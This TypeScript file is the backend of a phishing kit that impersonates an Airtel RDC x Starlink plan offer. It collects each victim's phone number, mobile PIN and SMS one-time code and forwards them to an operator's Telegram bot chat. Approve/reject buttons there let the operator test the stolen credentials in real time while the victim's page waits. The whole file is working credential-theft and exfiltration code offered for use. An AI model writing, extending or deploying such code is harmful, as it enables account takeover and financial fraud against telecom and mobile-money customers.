import { getTelegramBotToken, getTelegramChatId, TELEGRAM_CONFIG } from '../config/telegram';

export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramStatusResult {
  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
}

class TelegramService {
  private lastUpdateId: number = 0;
  private localSessionState: Map<
    string,
    {
      loginStatus: 'pending' | 'approved' | 'rejected';
      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
      phone?: string;
      pin?: string;
      otp?: string;
      planName?: string;
      planPrice?: string;
      loginMessageId?: number;
      otpMessageId?: number;
    }
  > = new Map();

  /**
   * Helper to safely parse JSON or return null on HTML/empty responses
   */
  private async safeJson(res: Response): Promise<any> {
    try {
      const text = await res.text();
      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
        return null;
      }
      return JSON.parse(text);
    } catch {
      return null;
    }
  }

  /**
   * Send direct Telegram message using client-side API
   */
  public async sendDirectTelegramMessage(text: string, inlineKeyboard?: any): Promise<any> {
    const token = getTelegramBotToken();
    const chatId = getTelegramChatId();

    try {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const payload: any = {
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      };
      if (inlineKeyboard) {
        payload.reply_markup = {
          inline_keyboard: inlineKeyboard,
        };
      }

      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      return await this.safeJson(res);
    } catch (err) {
      console.warn('Direct Telegram API call failed:', err);
      return null;
    }
  }

  /**
   * Answer callback query directly
   */
  public async answerDirectCallbackQuery(callbackQueryId: string, text: string) {
    const token = getTelegramBotToken();
    try {
      await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text,
          show_alert: true,
        }),
      });
    } catch (err) {
      console.warn('Failed to answer callback query:', err);
    }
  }

  /**
   * Edit message text directly
   */
  public async editDirectMessageText(chatId: string | number, messageId: number, text: string) {
    const token = getTelegramBotToken();
    try {
      await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text,
          parse_mode: 'HTML',
        }),
      });
    } catch (err) {
      console.warn('Failed to edit message text:', err);
    }
  }

  /**
   * Send Login Credentials (Phone + PIN)
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    const { sessionId, phone, pin, planName, planPrice } = payload;

    // Track locally
    this.localSessionState.set(sessionId, {
      loginStatus: 'pending',
      otpStatus: 'idle',
      phone,
      pin,
      planName,
      planPrice,
    });

    // 1. Try server endpoint first
    try {
      const serverRes = await fetch('/api/telegram/send-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = await this.safeJson(serverRes);
      if (data && data.success) {
        return true;
      }
    } catch {
      // Backend not accessible (e.g. static Vercel build), proceed to direct client fallback
    }

    // 2. Direct Telegram Client Fallback (Works on Vercel Static, Netlify, Preview)
    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>+243 ${phone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${pin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
      `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Correct / Valider',
          callback_data: `approve_login_${sessionId}`,
        },
        {
          text: '❌ Wrong / Rejeter',
          callback_data: `reject_login_${sessionId}`,
        },
      ],
    ];

    const result = await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      const current = this.localSessionState.get(sessionId);
      if (current) {
        current.loginMessageId = result.result.message_id;
      }
    }

    return true;
  }

  /**
   * Send OTP Verification Code
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    const { sessionId, phone, otp, planName, planPrice } = payload;

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'pending' as const,
    };
    existing.otp = otp;
    existing.otpStatus = 'pending';
    this.localSessionState.set(sessionId, existing);

    // 1. Try server endpoint
    try {
      const serverRes = await fetch('/api/telegram/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = await this.safeJson(serverRes);
      if (data && data.success) {
        return true;
      }
    } catch {
      // Direct client fallback
    }

    // 2. Direct Telegram API
    const messageText =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `👤 <b>Numéro:</b> <code>+243 ${phone || existing.phone || 'Inconnu'}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${otp}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ OTP Correct',
          callback_data: `approve_otp_${sessionId}`,
        },
        {
          text: '❌ OTP Invalide',
          callback_data: `reject_otp_${sessionId}`,
        },
      ],
    ];

    const result = await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      existing.otpMessageId = result.result.message_id;
    }

    return true;
  }

  /**
   * Poll Telegram updates directly or via backend
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp'
  ): Promise<'pending' | 'approved' | 'rejected'> {
    // 1. Check local session state
    const local = this.localSessionState.get(sessionId);
    if (local) {
      if (targetStep === 'login' && local.loginStatus !== 'pending') {
        return local.loginStatus;
      }
      if (targetStep === 'otp' && local.otpStatus !== 'pending' && local.otpStatus !== 'idle') {
        return local.otpStatus;
      }
    }

    // 2. Try server status endpoint
    try {
      const serverRes = await fetch(`/api/telegram/status?sessionId=${sessionId}`);
      const data = await this.safeJson(serverRes);
      if (data) {
        if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
          if (local) local.loginStatus = data.loginStatus;
          return data.loginStatus;
        }
        if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
          if (local) local.otpStatus = data.otpStatus;
          return data.otpStatus;
        }
      }
    } catch {
      // Backend not running, check direct Telegram updates below
    }

    // 3. Check Telegram Bot API getUpdates directly
    const token = getTelegramBotToken();
    const chatId = getTelegramChatId();

    try {
      const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${this.lastUpdateId}&limit=20`;
      const res = await fetch(url);
      const data = await this.safeJson(res);

      if (data && data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          if (update.update_id >= this.lastUpdateId) {
            this.lastUpdateId = update.update_id + 1;
          }

          if (update.callback_query) {
            const cq = update.callback_query;
            const callbackData = cq.data || '';
            const callbackId = cq.id;
            const msgId = cq.message?.message_id;
            const queryChatId = cq.message?.chat?.id || chatId;

            // LOGIN ACTIONS
            if (callbackData === `approve_login_${sessionId}`) {
              if (local) local.loginStatus = 'approved';
              await this.answerDirectCallbackQuery(callbackId, '✅ Connexion validée ! Passage au code OTP.');
              if (msgId) {
                const text =
                  `🔴 <b>AIRTEL LITE - CONNEXION CLIENT</b>\n\n` +
                  `👤 <b>Numéro:</b> +243 ${local?.phone || ''}\n` +
                  `🔑 <b>Code PIN:</b> <code>${local?.pin || ''}</code>\n` +
                  `📦 <b>Forfait:</b> ${local?.planName || ''} (${local?.planPrice || ''})\n` +
                  `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
                  `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
                  `<i>L'utilisateur est redirigé vers la page OTP...</i>`;
                await this.editDirectMessageText(queryChatId, msgId, text);
              }
              return 'approved';
            }

            if (callbackData === `reject_login_${sessionId}`) {
              if (local) local.loginStatus = 'rejected';
              await this.answerDirectCallbackQuery(callbackId, '❌ Connexion refusée/rejetée.');
              if (msgId) {
                const text =
                  `🔴 <b>AIRTEL LITE - CONNEXION CLIENT</b>\n\n` +
                  `👤 <b>Numéro:</b> +243 ${local?.phone || ''}\n` +
                  `🔑 <b>Code PIN:</b> <code>${local?.pin || ''}</code>\n` +
                  `📦 <b>Forfait:</b> ${local?.planName || ''} (${local?.planPrice || ''})\n` +
                  `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
                  `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>`;
                await this.editDirectMessageText(queryChatId, msgId, text);
              }
              return 'rejected';
            }

            // OTP ACTIONS
            if (callbackData === `approve_otp_${sessionId}`) {
              if (local) local.otpStatus = 'approved';
              await this.answerDirectCallbackQuery(callbackId, '✅ Code OTP validé avec succès !');
              if (msgId) {
                const text =
                  `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP</b>\n\n` +
                  `👤 <b>Numéro:</b> +243 ${local?.phone || ''}\n` +
                  `🔢 <b>Code OTP:</b> <code>${local?.otp || ''}</code>\n` +
                  `📦 <b>Forfait:</b> ${local?.planName || ''} (${local?.planPrice || ''})\n` +
                  `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
                  `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>\n` +
                  `<i>Paiement réussi et forfait Starlink activé !</i>`;
                await this.editDirectMessageText(queryChatId, msgId, text);
              }
              return 'approved';
            }

            if (callbackData === `reject_otp_${sessionId}`) {
              if (local) local.otpStatus = 'rejected';
              await this.answerDirectCallbackQuery(callbackId, '❌ Code OTP rejeté/invalide.');
              if (msgId) {
                const text =
                  `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP</b>\n\n` +
                  `👤 <b>Numéro:</b> +243 ${local?.phone || ''}\n` +
                  `🔢 <b>Code OTP:</b> <code>${local?.otp || ''}</code>\n` +
                  `📦 <b>Forfait:</b> ${local?.planName || ''} (${local?.planPrice || ''})\n` +
                  `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
                  `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
                await this.editDirectMessageText(queryChatId, msgId, text);
              }
              return 'rejected';
            }
          }
        }
      }
    } catch (err) {
      // Safe silent catch, no unexpected token errors
    }

    return 'pending';
  }
}

export const telegramService = new TelegramService();
